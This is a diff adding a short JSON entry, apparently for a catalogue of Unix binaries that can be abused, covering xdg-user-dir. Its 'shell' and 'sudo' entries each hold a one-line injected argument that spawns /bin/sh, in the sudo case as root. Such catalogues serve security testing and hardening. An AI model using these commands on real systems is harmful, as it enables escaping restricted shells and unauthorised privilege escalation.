@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "",
+        "code": "xdg-user-dir '}; /bin/sh #'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "sudo xdg-user-dir '}; /bin/sh #'\n"
+      }
+    ]
+  }
+}
